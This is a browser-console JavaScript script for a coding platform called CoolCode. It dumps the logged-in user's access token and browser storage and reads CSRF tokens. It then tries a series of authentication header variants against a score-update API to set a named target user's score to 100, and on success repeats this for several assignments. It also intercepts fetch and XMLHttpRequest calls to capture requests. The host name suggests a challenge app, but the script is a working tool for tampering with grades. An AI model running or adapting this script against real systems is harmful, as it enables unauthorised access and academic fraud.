// CoolCode REAL Endpoint Discovery - Phase 2
// This script focuses on finding the ACTUAL working score update method
// Run this in the browser console after logging in

console.log("🔍 Phase 2: Finding REAL score update endpoint...");

const token = localStorage.getItem('ACCESS_TOKEN');
const baseUrl = "https://coolcode-hacker-34c5455cd908.herokuapp.com";
const targetUser = "98ixul";

if (!token) {
    console.error("❌ Please log in first!");
    throw new Error("No ACCESS_TOKEN found");
}

console.log("🔑 ACCESS_TOKEN:", token);

// Let's decode the token to see what's inside
try {
    const decoded = JSON.parse(atob(token));
    console.log("🔓 Decoded token:", decoded);
} catch (e) {
    console.log("⚠️ Token is not base64 JSON, raw value:", token);
}

// Check all localStorage and sessionStorage for any other tokens/data
console.log("\n🗃️ All localStorage data:");
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    console.log(`   ${key}: ${value.substring(0, 100)}${value.length > 100 ? '...' : ''}`);
}

console.log("\n🗃️ All sessionStorage data:");
for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    const value = sessionStorage.getItem(key);
    console.log(`   ${key}: ${value.substring(0, 100)}${value.length > 100 ? '...' : ''}`);
}

// Check for any CSRF tokens in the page
const csrfMeta = document.querySelector('meta[name="csrf-token"]');
const csrfInput = document.querySelector('input[name="_token"]');
console.log("\n🛡️ CSRF tokens:");
console.log("   Meta CSRF:", csrfMeta ? csrfMeta.content : "Not found");
console.log("   Input CSRF:", csrfInput ? csrfInput.value : "Not found");

// Test the documented API endpoint with various authentication methods
async function testRealAPI() {
    console.log("\n🎯 Testing the documented API endpoint with different auth methods...");
    
    const apiUrl = `${baseUrl}/api/api/assignment/score`;
    const payload = {
        username: targetUser,
        assignmentId: 1,
        score: 100
    };
    
    const authMethods = [
        { name: "ACCESS_TOKEN header", headers: { 'ACCESS_TOKEN': token, 'Content-Type': 'application/json' } },
        { name: "Bearer token", headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } },
        { name: "X-Auth-Token", headers: { 'X-Auth-Token': token, 'Content-Type': 'application/json' } },
        { name: "Token header", headers: { 'Token': token, 'Content-Type': 'application/json' } },
        { name: "X-Access-Token", headers: { 'X-Access-Token': token, 'Content-Type': 'application/json' } },
        { name: "No auth", headers: { 'Content-Type': 'application/json' } },
    ];
    
    // Add CSRF if found
    if (csrfMeta) {
        authMethods.push({ 
            name: "ACCESS_TOKEN + CSRF", 
            headers: { 
                'ACCESS_TOKEN': token, 
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrfMeta.content 
            } 
        });
    }
    
    for (const method of authMethods) {
        try {
            console.log(`Testing: ${method.name}`);
            
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: method.headers,
                body: JSON.stringify(payload)
            });
            
            const responseText = await response.text();
            
            console.log(`   Status: ${response.status}`);
            console.log(`   Response: ${responseText.substring(0, 200)}${responseText.length > 200 ? '...' : ''}`);
            
            if (response.ok && !responseText.includes('<!doctype html>')) {
                console.log(`   ✅ SUCCESS with ${method.name}!`);
                return { method: method.name, headers: method.headers, response: responseText };
            } else if (response.status === 403) {
                console.log(`   🔒 Authentication/Authorization issue`);
            } else if (response.status === 500) {
                console.log(`   💥 Server error`);
            }
            
        } catch (error) {
            console.log(`   ❌ Error: ${error.message}`);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return null;
}

// Look for any form submissions or AJAX calls in the page
console.log("\n🔍 Looking for forms and existing scripts...");

// Check for any forms
const forms = document.querySelectorAll('form');
console.log(`Found ${forms.length} forms:`);
forms.forEach((form, index) => {
    console.log(`   Form ${index + 1}: action="${form.action}", method="${form.method}"`);
    const inputs = form.querySelectorAll('input, select, textarea');
    inputs.forEach(input => {
        if (input.name) {
            console.log(`     Input: ${input.name} (${input.type})`);
        }
    });
});

// Check for any fetch/XMLHttpRequest calls by intercepting them
let originalFetch = window.fetch;
let fetchCalls = [];

window.fetch = function(...args) {
    fetchCalls.push({ url: args[0], options: args[1], timestamp: new Date() });
    console.log(`🌐 Intercepted fetch: ${args[0]}`);
    return originalFetch.apply(this, args);
};

console.log("📡 Fetch interception enabled. Any network calls will be logged.");

// Test if we can find the user's current scores
async function getCurrentScores() {
    console.log("\n📊 Trying to get current scores for verification...");
    
    const endpoints = [
        `${baseUrl}/api/user/${targetUser}/assignments`,
        `${baseUrl}/api/assignments/${targetUser}`,
        `${baseUrl}/api/scores/${targetUser}`,
        `${baseUrl}/api/student/${targetUser}`,
        `${baseUrl}/ui/api/user/${targetUser}/scores`,
        `${baseUrl}/ui/api/student/${targetUser}`,
    ];
    
    for (const endpoint of endpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: {
                    'ACCESS_TOKEN': token,
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                const data = await response.text();
                if (!data.includes('<!doctype html>')) {
                    console.log(`✅ Found scores endpoint: ${endpoint}`);
                    console.log(`   Data: ${data.substring(0, 300)}...`);
                    try {
                        const json = JSON.parse(data);
                        console.log(`   Parsed:`, json);
                    } catch (e) {
                        console.log(`   (Not JSON)`);
                    }
                }
            }
        } catch (error) {
            // Ignore errors
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
    }
}

// Main execution
async function runPhase2Discovery() {
    console.log("\n🚀 Starting Phase 2 Discovery...");
    
    await getCurrentScores();
    
    const apiResult = await testRealAPI();
    
    if (apiResult) {
        console.log("\n🎉 FOUND WORKING API METHOD!");
        console.log("Method:", apiResult.method);
        console.log("Headers:", apiResult.headers);
        console.log("Response:", apiResult.response);
        
        // Test with multiple assignments
        console.log("\n🔄 Testing with multiple assignments...");
        for (let i = 1; i <= 5; i++) {
            try {
                const testResponse = await fetch(`${baseUrl}/api/api/assignment/score`, {
                    method: 'POST',
                    headers: apiResult.headers,
                    body: JSON.stringify({
                        username: targetUser,
                        assignmentId: i,
                        score: 100
                    })
                });
                
                const responseText = await testResponse.text();
                console.log(`Assignment ${i}: ${testResponse.status} - ${responseText.substring(0, 100)}`);
            } catch (error) {
                console.log(`Assignment ${i}: Error - ${error.message}`);
            }
            
            await new Promise(resolve => setTimeout(resolve, 200));
        }
    } else {
        console.log("\n😞 No working API method found.");
        console.log("💡 Suggestions:");
        console.log("1. Try manually changing a score in the UI and watch the Network tab");
        console.log("2. Look for any JavaScript files that handle score updates");
        console.log("3. Check if there's a different authentication mechanism");
        console.log("4. The score updates might be handled client-side only");
    }
    
    console.log("\n📝 Network calls intercepted:", fetchCalls);
    
    // Restore original fetch
    window.fetch = originalFetch;
    
    return { apiResult, fetchCalls };
}

// Helper function to monitor network activity
window.monitorNetworkForScoreUpdates = function() {
    console.log("🔍 Monitoring network activity...");
    console.log("💡 Now try to manually change a score in the UI and I'll capture the request!");
    
    let networkCalls = [];
    
    // Intercept fetch
    let originalFetch = window.fetch;
    window.fetch = function(...args) {
        const [url, options] = args;
        if (url.includes('score') || url.includes('assignment') || options?.body) {
            networkCalls.push({
                type: 'fetch',
                url: url,
                method: options?.method || 'GET',
                headers: options?.headers || {},
                body: options?.body,
                timestamp: new Date()
            });
            console.log(`🌐 SCORE-RELATED FETCH: ${options?.method || 'GET'} ${url}`);
            if (options?.body) {
                console.log(`   Body: ${options.body}`);
            }
        }
        return originalFetch.apply(this, args);
    };
    
    // Intercept XMLHttpRequest
    let originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        let xhr = new originalXHR();
        let originalOpen = xhr.open;
        let originalSend = xhr.send;
        
        xhr.open = function(method, url, ...args) {
            this._method = method;
            this._url = url;
            return originalOpen.apply(this, [method, url, ...args]);
        };
        
        xhr.send = function(body) {
            if (this._url && (this._url.includes('score') || this._url.includes('assignment') || body)) {
                networkCalls.push({
                    type: 'xhr',
                    url: this._url,
                    method: this._method,
                    body: body,
                    timestamp: new Date()
                });
                console.log(`🌐 SCORE-RELATED XHR: ${this._method} ${this._url}`);
                if (body) {
                    console.log(`   Body: ${body}`);
                }
            }
            return originalSend.apply(this, [body]);
        };
        
        return xhr;
    };
    
    window.stopNetworkMonitoring = function() {
        window.fetch = originalFetch;
        window.XMLHttpRequest = originalXHR;
        console.log("🛑 Network monitoring stopped");
        console.log("📊 Captured calls:", networkCalls);
        return networkCalls;
    };
    
    console.log("✅ Network monitoring active. Use stopNetworkMonitoring() to stop and see results.");
};

// Run the discovery
runPhase2Discovery().then(results => {
    console.log("\n🎯 Phase 2 Discovery Complete!");
    console.log("📋 Results stored in window.phase2Results");
    window.phase2Results = results;
    
    console.log("\n🔧 Available helper functions:");
    console.log("- monitorNetworkForScoreUpdates() - Monitor for manual score changes");
    console.log("- stopNetworkMonitoring() - Stop monitoring and see results");
});
